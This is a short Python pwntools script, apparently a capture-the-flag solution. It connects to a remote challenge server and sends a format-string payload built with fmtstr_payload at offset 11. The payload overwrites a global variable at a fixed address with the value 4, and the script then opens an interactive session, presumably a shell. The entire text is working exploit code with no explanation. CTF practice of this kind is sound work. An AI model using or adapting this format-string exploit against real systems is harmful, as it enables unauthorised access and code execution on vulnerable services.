from pwn import *

binsh = 0x080486f3
x = 0x0804a02c

#conn = process('./fm')
conn = remote('node4.buuoj.cn', 27088)

payload = fmtstr_payload(11, {0x0804a02c: 0x4})
conn.sendline(payload)
#conn.recv()
conn.interactive()
